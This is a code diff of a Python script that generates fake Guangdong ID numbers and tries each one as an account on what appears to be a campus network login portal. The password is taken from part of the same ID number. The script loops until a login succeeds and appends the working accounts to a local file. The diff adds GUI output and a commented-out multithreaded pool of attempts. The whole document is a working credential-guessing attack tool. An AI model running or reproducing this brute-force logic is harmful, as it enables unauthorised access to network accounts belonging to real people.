@@ -5,14 +5,14 @@
 # @Software : PyCharm
 
 
+from re import I
+from turtle import back
 from id_validator import validator
 import requests
-
+import threading
 
 def idHit():
     id = validator.fake_id(True, '广东省', '2001')
-    print("账号为：" + id)
-    print("密码为：" + id[12:18])
     return id
 
 
@@ -21,7 +21,6 @@ def netHid(id, ip):
     headers = {
 
         "User-Agent": 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
-        # "Referer": "http://192.168.60.253/"
     }
     data = {
         "callback": "dr1003",
@@ -40,19 +39,44 @@ def netHid(id, ip):
         "lang": "zh"
     }
     req = requests.get(url=url, headers=headers, params=data)
-    print(req.text)
     return req.text
+    # return '认证成功'
 
 
-def hit():
-    i = 1
+def hit(ip,textbox):
     while 1:
-        print("第" + str(i) + "次")
-        ll = 'dr1003({"result":0,"msg":"账号不存在","ret_code":4});'
-        if netHid(idHit(), '10.10.234.109') == ll:
+        id = idHit()
+        textbox.insert("end", f"当前账号{id}\n")
+        cent = netHid(id,ip)
+
+        if '成功' in cent or 'in' in cent :
+            print(cent)
+            with open("zhanghao.txt","a") as f:
+                f.write(str(id) + '\n')
+                f.write(cent + '\n')
+            textbox.insert("end", f"{cent}\n")
+            break
+        elif '系统忙' in cent or '不存在' in cent :
+            print(id)
             pass
         else:
-            exit()
-        i = i + 1
+            textbox.insert("end", f"-----出问题！暂停了！------- {cent}\n")
+            break
 
 
+def main(textbox,ip,t_num):
+
+    # l = []  # 子线程池
+    # for i in range(int(t_num)): 
+    #     t = threading.Thread(target=hit,args=(ip,textbox,))
+    #     l.append(t)  # 将子线程添加到线程池统一管理
+    #     t.start()
+    # for k in l:
+    #     k.join()
+    hit(ip,textbox)
+    
+
+
+
+if __name__ == '__main__':
+    pass
